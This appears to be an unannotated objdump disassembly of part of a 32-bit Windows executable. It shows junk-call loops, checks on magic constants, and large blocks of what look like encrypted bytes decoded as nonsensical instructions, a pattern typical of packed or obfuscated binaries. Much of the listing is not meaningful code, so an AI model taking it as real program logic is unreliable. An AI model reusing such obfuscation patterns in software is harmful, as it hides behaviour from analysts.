  40183c:	mov    esi,DWORD PTR ds:0x4303d9
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x4303d9,esi
  401849:	cmp    DWORD PTR ds:0x4303d9,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42ea13
  401863:	cmp    DWORD PTR ds:0x4303d9,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x430463,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x430463
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x430463,esi
  401898:	cmp    DWORD PTR ds:0x430463,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x430463,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e92b
  4018bd:	cmp    DWORD PTR ds:0x430463,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x430463
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x430463,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ed57
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ed5b,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ed5b
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ed5b,esi
  4018fe:	cmp    DWORD PTR ds:0x42ed5b,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42eb8f
  401914:	cmp    DWORD PTR ds:0x42ed5b,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ed5b
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ed5b,esi
  40192e:	cmp    DWORD PTR ds:0x42ed5b,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42ed4b,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x43045b,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x43045b
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x43045b,esi
  401966:	cmp    DWORD PTR ds:0x43045b,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x43045b,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e837
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42ea17
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x4303bd
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x4303b5,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x4303b5
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x4303b5,ebx
  4019c4:	cmp    DWORD PTR ds:0x4303b5,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e8c5
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e93b
  4019e5:	cmp    DWORD PTR ds:0x4303b5,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x197fe549
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a69
  401a76:	add    eax,0xbcc08cd1
  401a7b:	push   0x5f
  401a7d:	adc    BYTE PTR ds:0xc7690930,bl
  401a83:	inc    eax
  401a84:	(bad)  [edx]
  401a86:	sub    bh,0xb8
  401a89:	(bad)  
  401a8b:	loope  0x401a5b
  401a8d:	adc    DWORD PTR [eax-0x3c],ebp
  401a90:	hlt    
  401a91:	jg     0x401b05
  401a93:	leave  
  401a94:	xor    DWORD PTR [ebx+0xa145f4b],esi
  401a9a:	aas    
  401a9b:	adc    bh,BYTE PTR [esi-0x18]
  401a9e:	sub    DWORD PTR [ebp-0x26],esp
  401aa1:	inc    edx
  401aa2:	out    0x8d,al
  401aa4:	sbb    DWORD PTR [ecx-0x64],ecx
  401aa7:	xchg   DWORD PTR [eax+ebx*2-0x6fa85cca],esp
  401aae:	fdivr  QWORD PTR [edx-0x44]
  401ab1:	adc    al,0xf9
  401ab3:	lods   eax,DWORD PTR ds:[esi]
  401ab4:	pop    ebx
  401ab5:	mov    bl,0x29
  401ab7:	cmp    BYTE PTR [edi-0x2192a52c],0x1b
  401abe:	int    0x9
  401ac0:	cdq    
  401ac1:	jnp    0x401af8
  401ac3:	jnp    0x401a83
  401ac5:	sahf   
  401ac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ac7:	ja     0x401a80
  401ac9:	jo     0x401a51
  401acb:	or     ch,BYTE PTR [esp+ebx*1-0x69]
  401acf:	into   
  401ad0:	push   ecx
  401ad1:	push   esp
  401ad2:	ins    BYTE PTR es:[edi],dx
  401ad3:	jg     0x401a9b
  401ad5:	ret    0x2f07
  401ad8:	pop    eax
  401ad9:	outs   dx,DWORD PTR ds:[esi]
  401ada:	out    0xaa,al
  401adc:	xchg   ebp,eax
  401add:	and    bh,bh
  401adf:	es pop es
  401ae1:	xchg   ecx,eax
  401ae2:	add    DWORD PTR [edx],0xf68af39d
  401ae8:	out    0xda,eax
  401aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aeb:	pop    edx
  401aec:	dec    eax
  401aed:	cli    
  401aee:	and    BYTE PTR [ebx+0x5a],0x98
  401af2:	pop    eax
  401af3:	fcomip st,st(7)
  401af5:	jmp    0x1fbccd85
  401afa:	or     DWORD PTR [ebx-0x1f],edi
  401afd:	xchg   edi,eax
  401afe:	inc    ecx
  401aff:	pushf  
  401b00:	xor    bh,BYTE PTR [ebx-0x27aa266c]
  401b06:	fs mov ecx,0xf64c43c1
  401b0c:	or     bh,BYTE PTR [ebx]
  401b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b0f:	stos   DWORD PTR es:[edi],eax
  401b10:	sahf   
  401b11:	xor    eax,eax
  401b13:	ret    0x6942
  401b16:	repz aaa 
  401b18:	or     bh,dl
  401b1a:	mov    ch,0x10
  401b1c:	dec    esp
  401b1d:	and    al,0xa7
  401b1f:	in     eax,dx
  401b20:	cwde   
  401b21:	jns    0x401b36
  401b23:	fild   WORD PTR [eax+0x7818893f]
  401b29:	mov    esi,DWORD PTR [eax-0x61090a69]
  401b2f:	aad    0x97
  401b31:	iret   
  401b32:	mov    ebx,DWORD PTR [ebp+0x7a]
  401b35:	xchg   ecx,eax
  401b36:	add    al,0x4c
  401b38:	add    al,0x46
  401b3a:	push   ecx
  401b3b:	xor    BYTE PTR ds:0xef103147,dh
  401b41:	mov    bh,0x2c
  401b43:	xchg   esi,eax
  401b44:	add    eax,0xf06cf83
  401b49:	addr16 out 0xee,eax
  401b4c:	push   edi
  401b4d:	aam    0xe7
  401b4f:	add    dl,BYTE PTR [esi+0x21d56ed2]
  401b55:	popf   
  401b56:	or     al,0x48
  401b58:	stc    
  401b59:	scas   eax,DWORD PTR es:[edi]
  401b5a:	pushf  
  401b5b:	push   ebx
  401b5c:	cmp    DWORD PTR [esi-0x2e7abc95],0x37690651
  401b66:	ror    DWORD PTR [ecx],cl
  401b68:	pop    eax
  401b69:	repz test BYTE PTR [edx+0x74],ah
  401b6d:	fcomp  QWORD PTR [ecx]
  401b6f:	jle    0x401b7e
  401b71:	icebp  
  401b72:	inc    edx
  401b73:	fist   WORD PTR [esi-0x42]
  401b76:	out    dx,al
  401b77:	ret    
  401b78:	pop    ds
  401b79:	or     eax,0xc5d393fa
  401b7e:	push   ecx
  401b7f:	cli    
  401b80:	int3   
  401b81:	mov    dh,0xcd
  401b83:	scas   al,BYTE PTR es:[edi]
  401b84:	xchg   BYTE PTR [edx],al
  401b86:	mov    DWORD PTR [edi+0x7a],edi
  401b89:	data16 repnz cmp BYTE PTR gs:[eax-0x43],ch
  401b8f:	call   0xdd31:0xe87fce3e
  401b96:	sub    BYTE PTR [ebx+0x149b41f],ch
  401b9c:	test   BYTE PTR [ecx],dl
  401b9e:	mov    dh,0x95
  401ba0:	shl    BYTE PTR [esi+ebx*4+0x5c],1
  401ba4:	mov    dh,0x70
  401ba6:	xchg   WORD PTR [edi*2+0xa300d26],di
  401bae:	adc    ch,BYTE PTR [edi-0x3ea2396d]
  401bb4:	stc    
  401bb5:	and    bh,cl
  401bb7:	test   DWORD PTR [edi+0x3543f0f7],esi
  401bbd:	mov    edx,0x755c79de
  401bc2:	ftst   
  401bc4:	imul   esp,DWORD PTR [eax-0x56],0xc1e9a0e8
  401bcb:	or     eax,0x3ea4b7fc
  401bd0:	mov    DWORD PTR [eax-0x24],ebp
  401bd3:	inc    esp
  401bd4:	call   DWORD PTR [esi]
  401bd6:	outs   dx,BYTE PTR ds:[esi]
  401bd7:	xor    DWORD PTR ds:0x75a986a7,ebx
  401bdd:	or     eax,DWORD PTR [edi+0x7816da3b]
  401be3:	inc    ebp
  401be4:	xor    al,0x69
  401be6:	dec    edi
  401be7:	mov    ch,0xd4
  401be9:	retf   0x5867
  401bec:	mov    ch,0x4
  401bee:	inc    eax
  401bef:	xor    al,0xc0
  401bf1:	int    0x7b
  401bf3:	out    0xe4,eax
  401bf5:	into   
  401bf6:	sti    
  401bf7:	int    0x88
  401bf9:	cmp    BYTE PTR [ecx-0x1fcf76c9],0x69
  401c00:	jg     0x401c12
  401c02:	cmp    eax,0x6f4ff546
  401c07:	lods   al,BYTE PTR ds:[esi]
  401c08:	dec    edi
  401c09:	xchg   esp,eax
  401c0a:	sti    
  401c0b:	push   0xffffff8f
  401c0d:	or     dl,BYTE PTR [edi+0x778fedd7]
  401c13:	and    al,0xc
  401c15:	and    al,0x8a
  401c17:	mov    eax,ds:0x8d179d87
  401c1c:	inc    ebp
  401c1d:	hlt    
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	fdivr  DWORD PTR [eax-0xb]
  401c93:	adc    DWORD PTR [eax],esi
  401c95:	push   es
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401c21
  401c9d:	mov    esp,0x26d1d61f
  401ca2:	(bad)  
  401ca3:	cs inc edx
  401ca5:	pushf  
  401ca6:	cmc    
  401ca7:	outs   dx,BYTE PTR ds:[esi]
  401ca8:	add    BYTE PTR [edi],bh
  401caa:	dec    eax
  401cab:	mov    ds,WORD PTR [ecx+0x32883f74]
  401cb1:	ror    BYTE PTR [esp+edx*2+0x79f77684],0x55
  401cb9:	mov    esi,0xb48ba511
  401cbe:	or     ch,bl
  401cc0:	xchg   ebx,eax
  401cc1:	mul    DWORD PTR [ebp-0x70]
  401cc4:	(bad)
  401cc8:	ja     0x401d1f
  401cca:	adc    ah,al
  401ccc:	call   0xba36:0xc6f91a3b
  401cd3:	add    cl,BYTE PTR [edi]
  401cd5:	xor    eax,0xd3f9706a
  401cda:	add    al,BYTE PTR [ebp+eax*8-0x58]
  401cde:	mov    edx,0xd2cd621f
  401ce3:	lock dec eax
  401ce5:	add    esi,DWORD PTR [edx+0x42]
  401ce8:	in     al,dx
  401ce9:	jmp    0x401cea
  401ceb:	add    esi,ecx
  401ced:	sahf   
  401cee:	push   edi
  401cef:	shl    BYTE PTR [eax-0x61],cl
  401cf2:	xor    DWORD PTR [ecx+0x2b],esp
  401cf5:	xchg   DWORD PTR [edx-0x6b6318be],edx
  401cfb:	jecxz  0x401c85
  401cfd:	fnstsw WORD PTR [edx-0x3e]
  401d00:	push   ebx
  401d01:	ja     0x401cde
  401d03:	lods   eax,DWORD PTR ds:[esi]
  401d04:	nop
  401d05:	xor    DWORD PTR [esi],ecx
  401d07:	repz pushf 
  401d09:	jnp    0x401ce9
  401d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d0c:	mov    bh,0x6c
  401d0e:	(bad)  
  401d0f:	push   esp
  401d10:	jmp    0x401ced
  401d12:	mov    eax,ds:0x4a2bcf5f
  401d17:	pushf  
  401d18:	ins    DWORD PTR es:[edi],dx
  401d19:	daa    
  401d1a:	ds fwait
  401d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d1d:	lea    esi,[eax+ebp*1+0x2dd59d8a]
  401d24:	fwait
  401d25:	rcr    DWORD PTR [edx-0x5afa0ed6],0x67
  401d2c:	and    dl,al
  401d2e:	pushw  es
  401d30:	sti    
  401d31:	push   esi
  401d32:	pop    edi
  401d33:	cmp    ebx,DWORD PTR es:[ecx+0x79]
  401d37:	jmp    0x9ba4:0x9235f6de
  401d3e:	mov    al,0xff
  401d40:	dec    BYTE PTR [esi+0x2555a82]
  401d46:	ficomp WORD PTR [edi]
  401d48:	mov    edx,DWORD PTR [eax]
  401d4a:	push   0xaf5af698
  401d4f:	in     al,0xf5
  401d51:	sub    BYTE PTR [ecx+ebp*8+0x6b696513],bl
  401d58:	or     ah,BYTE PTR [esi-0x69418645]
  401d5e:	inc    ebp
  401d5f:	cmc    
  401d60:	sar    BYTE PTR [edx],1
  401d62:	scas   eax,DWORD PTR es:[edi]
  401d63:	add    DWORD PTR [ebp-0x339e13fc],eax
  401d69:	push   eax
  401d6a:	ss jge 0x401dbe
  401d6d:	ror    DWORD PTR [esp+edx*8-0x30],0x77
  401d72:	loop   0x401d00
  401d74:	sbb    ah,BYTE PTR [edi-0x5290e6a5]
  401d7a:	ret    
  401d7b:	dec    edi
  401d7c:	aad    0xa6
  401d7e:	push   es
  401d7f:	std    
  401d80:	bound  edx,QWORD PTR [edx]
  401d82:	fsub   DWORD PTR [ebp-0x514594ba]
  401d88:	or     dl,dl
  401d8a:	into   
  401d8b:	mov    ch,0x46
  401d8d:	cmc    
  401d8e:	les    esp,FWORD PTR [ecx-0x1b906028]
  401d94:	bound  ecx,QWORD PTR [edx+ecx*4]
  401d97:	inc    esp
  401d98:	dec    edx
  401d99:	cs push eax
  401d9b:	sbb    DWORD PTR [esi+ebx*2-0x6c47e675],edi
  401da2:	adc    DWORD PTR [edi-0x55],esp
  401da5:	std    
  401da6:	pop    esi
  401da7:	hlt    
  401da8:	pop    esp
  401da9:	xchg   ebx,eax
  401daa:	test   BYTE PTR es:0x669d1e42,ch
  401db1:	in     al,dx
  401db2:	loop   0x401dd2
  401db4:	das    
  401db5:	loop   0x401e31
  401db7:	xchg   ebp,eax
  401db8:	cmp    cl,cl
  401dba:	pop    ds
  401dbb:	pop    edi
  401dbc:	fs jbe 0x401e11
  401dbf:	mov    ds:0x1704bec1,al
  401dc4:	dec    ecx
  401dc5:	mov    bl,dl
  401dc7:	cmp    BYTE PTR [eax+0x62a656ee],ch
  401dcd:	gs xor al,0x7c
  401dd0:	in     eax,dx
  401dd1:	pop    edx
  401dd2:	out    dx,al
  401dd3:	or     DWORD PTR [edx],edi
  401dd5:	fadd   QWORD PTR [edi-0x5afacd06]
  401ddb:	inc    esi
  401ddc:	retf   0xef6b
  401ddf:	pushf  
  401de0:	ds clc 
  401de2:	js     0x401deb
  401de4:	gs mov eax,0x1a703a6f
  401dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401deb:	jl     0x401d9d
  401ded:	adc    edi,edx
  401def:	jg     0x401db9
  401df1:	out    dx,eax
  401df2:	push   ecx
  401df3:	test   eax,0x864bbd0c
  401df8:	div    DWORD PTR [ecx-0x575db200]
  401dfe:	loope  0x401e0b
  401e00:	xchg   esp,eax
  401e01:	out    0xb1,al
  401e03:	mov    esp,0x36857bd1
  401e08:	dec    esp
  401e09:	das    
  401e0a:	mov    edx,0xb46b48b2
  401e0f:	push   cs
  401e10:	mov    edi,DWORD PTR [eax]
  401e12:	push   ss
  401e13:	sar    ecx,0x22
  401e16:	ss pushf 
  401e18:	xlat   BYTE PTR ds:[ebx]
  401e19:	sbb    BYTE PTR [ebp-0x3a8d4509],ah
  401e1f:	pop    esp
  401e20:	ret    
  401e21:	cmp    al,0xdb
  401e23:	sub    al,0x25
  401e25:	cld    
  401e26:	xor    DWORD PTR [esi-0x7b249df1],esi
  401e2c:	iret   
  401e2d:	add    ah,cl
  401e2f:	cli    
  401e30:	mov    ebp,0x9c5f0ada
  401e35:	jnp    0x401e9f
  401e37:	in     eax,dx
  401e38:	jge    0x401e2a
  401e3a:	jmp    0x21b6:0x122ec03e
  401e41:	xor    DWORD PTR cs:[eax],0x2650fa8f
  401e48:	jmp    0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	cli    
  401e81:	pop    ss
  401e82:	xor    dl,BYTE PTR ds:0x7e7e075a
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e3c
  401e8d:	ja     0x401e57
  401e8f:	dec    esp
  401e90:	mov    edx,0xa2c36b57
  401e95:	push   DWORD PTR [ecx-0x7f]
  401e98:	clc    
  401e99:	int    0x28
  401e9b:	xor    ebp,DWORD PTR [ebx-0x52]
  401e9e:	mov    edx,0x15f1f5b3
  401ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ea4:	test   al,0x34
  401ea6:	dec    esp
  401ea7:	test   al,0xa5
  401ea9:	mov    bh,0x54
  401eab:	sbb    DWORD PTR [ebp-0x71d9c9ef],ebp
  401eb1:	jmp    eax
  401eb3:	inc    ebx
  401eb4:	pop    ss
  401eb5:	mov    BYTE PTR [ecx+0x1d],al
  401eb8:	cmp    DWORD PTR [eax-0x2e695ddf],edx
  401ebe:	lds    esi,FWORD PTR [ecx+0xc8ca1a8]
  401ec4:	arpl   WORD PTR [ebp+0x34e0857c],cx
  401eca:	and    bh,cl
  401ecc:	dec    edx
  401ecd:	cmp    DWORD PTR [esi-0x146f9e04],0xa4765c58
  401ed7:	push   0xfe6a079f
  401edc:	rsqrtps xmm2,XMMWORD PTR [ebp+0x24]
  401ee0:	test   al,0x20
  401ee2:	jno    0x401f61
  401ee4:	fnstcw WORD PTR [ebp-0xc20e7d4]
  401eea:	gs ins DWORD PTR es:[edi],dx
  401eec:	jmp    FWORD PTR [eax+0x6a9f40a8]
  401ef2:	and    al,0x96
  401ef4:	retf   0xb0ce
  401ef7:	mov    al,ds:0xf118cb19
  401efc:	cmp    al,0xf0
  401efe:	cmp    esp,DWORD PTR [edi]
  401f00:	mov    esi,0x11c399b0
  401f05:	inc    edi
  401f06:	out    dx,eax
  401f07:	jae    0x401f03
  401f09:	cmc    
  401f0a:	fadd   DWORD PTR [ebp-0x5583c917]
  401f10:	xor    bh,BYTE PTR [ecx]
  401f12:	pop    ds
  401f13:	pop    edi
  401f14:	cdq    
  401f15:	mov    esp,0xed153d9d
  401f1a:	fild   WORD PTR [eax]
  401f1c:	shl    DWORD PTR [edi],0x48
  401f1f:	sahf   
  401f20:	jecxz  0x401f22
  401f22:	retf   
  401f23:	lock pmuludq mm1,QWORD PTR [edi]
  401f27:	pop    esp
  401f28:	dec    ebx
  401f29:	bswap  edx
  401f2b:	inc    edx
  401f2c:	fisttp QWORD PTR [edx]
  401f2e:	(bad)  
  401f2f:	cmp    BYTE PTR [ebx],bl
  401f31:	xchg   edi,eax
  401f32:	xchg   edx,eax
  401f33:	mov    ebp,0xc89f1165
  401f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f39:	dec    esi
  401f3a:	retf   0x9cb1
  401f3d:	int    0x53
  401f3f:	and    ebp,ecx
  401f41:	daa    
  401f42:	out    0xa5,al
  401f44:	int3   
  401f45:	retf   
  401f46:	xchg   ebx,eax
  401f47:	adc    eax,0xe36c2795
  401f4c:	ss daa 
  401f4e:	fmul   DWORD PTR [ecx+edi*8+0x39f8f7d9]
  401f55:	mov    BYTE PTR [edx-0x41],ch
  401f58:	inc    edi
  401f59:	mov    esi,0xb0d692f1
  401f5e:	in     al,0xfe
  401f60:	leave  
  401f61:	mov    DWORD PTR [edx],edi
  401f63:	test   eax,0x64064db0
  401f68:	int3   
  401f69:	sub    eax,0x9eb66f75
  401f6e:	ror    DWORD PTR [ebp-0x3f],cl
  401f71:	icebp  
  401f72:	add    eax,0x592f5525
  401f77:	push   ecx
  401f78:	lea    eax,[eax-0x24]
  401f7b:	xor    dl,BYTE PTR [esi]
  401f7d:	fld    QWORD PTR [edi-0x6f]
  401f80:	push   edi
  401f81:	and    esp,DWORD PTR [ebx]
  401f83:	fisttp QWORD PTR [ebp-0x193ffa94]
  401f89:	jbe    0x401fe7
  401f8b:	xchg   ebp,eax
  401f8c:	mov    ebp,0x7603a539
  401f91:	mov    ch,0xe0
  401f93:	jne    0x401fc1
  401f95:	or     ah,BYTE PTR [edi+0x1d]
  401f98:	outs   dx,BYTE PTR fs:[esi]
  401f9a:	mov    WORD PTR [ebx+edx*4-0x3fe66e2a],gs
  401fa1:	add    al,bh
  401fa3:	sti    
  401fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fa5:	dec    edx
  401fa6:	mov    edx,0x11a76303
  401fab:	in     eax,dx
  401fac:	mov    al,0x36
  401fae:	mov    bh,0xbd
  401fb0:	ret    0xeaa2
  401fb3:	mov    esi,0xe6cf66af
  401fb8:	push   ebp
  401fb9:	mov    cl,0xe1
  401fbb:	addr16 dec eax
  401fbd:	pop    edx
  401fbe:	in     al,dx
  401fbf:	aad    0xfa
  401fc1:	fist   DWORD PTR [eax+0x12699f84]
  401fc7:	pop    edi
  401fc8:	dec    edx
  401fc9:	push   ebx
  401fca:	js     0x401fcc
  401fcc:	or     cl,0xa7
  401fcf:	inc    ebp
  401fd0:	push   ebp
  401fd1:	inc    edi
  401fd2:	mov    edi,0xcca7a4ec
  401fd7:	jl     0x40203b
  401fd9:	pushf  
  401fda:	rcr    BYTE PTR [esp+esi*4+0x14],cl
  401fde:	das    
  401fdf:	retf   
  401fe0:	add    eax,0x957be33a
  401fe5:	stos   BYTE PTR es:[edi],al
  401fe6:	mov    eax,0x5510ee2a
  401feb:	dec    esi
  401fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fed:	and    al,0x1b
  401fef:	imul   ebx,DWORD PTR [ecx],0xa6ebd6ae
  401ff5:	jns    0x402035
  401ff7:	push   ecx
  401ff8:	and    eax,0x6d60d6bc
  401ffd:	fwait
  401ffe:	jnp    0x401fbc
  402000:	push   eax
  402001:	pop    eax
  402002:	adc    DWORD PTR ds:[ebp-0x298c02],ebx
  402009:	les    esi,FWORD PTR [bp+di-0x179d]
  40200e:	or     ecx,DWORD PTR [eax+eax*1+0x1ac69e14]
  402015:	add    al,0xcd
  402017:	arpl   WORD PTR [ebp-0x21],bx
  40201a:	add    DWORD PTR [ecx-0x382b9f3d],0xb8c743a3
  402024:	data16 rcl BYTE PTR [edx+0x45],1
  402028:	mov    ds:0x8b17aa42,al
  40202d:	hlt    
  40202e:	out    dx,eax
  40202f:	mov    ebp,0xc60383f6
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020e5:	sbb    ch,dh
  4020e7:	ja     0x40206d
  4020e9:	add    eax,0x7f557e7e
  4020ee:	jle    0x40216e
  4020f0:	cmc    
  4020f1:	ins    BYTE PTR es:[edi],dx
  4020f2:	cli    
  4020f3:	test   ebp,esi
  4020f5:	xchg   dl,ah
  4020f7:	jnp    0x402151
  4020f9:	mov    bl,BYTE PTR [edx+0x12]
  4020fc:	adc    dl,bl
  4020fe:	jmp    0x4020ea
  402100:	fst    DWORD PTR [ecx]
  402102:	ret    
  402103:	shl    DWORD PTR [ebx],0x1
  402106:	and    eax,0x7dfc6114
  40210b:	int    0xe0
  40210d:	(bad)  
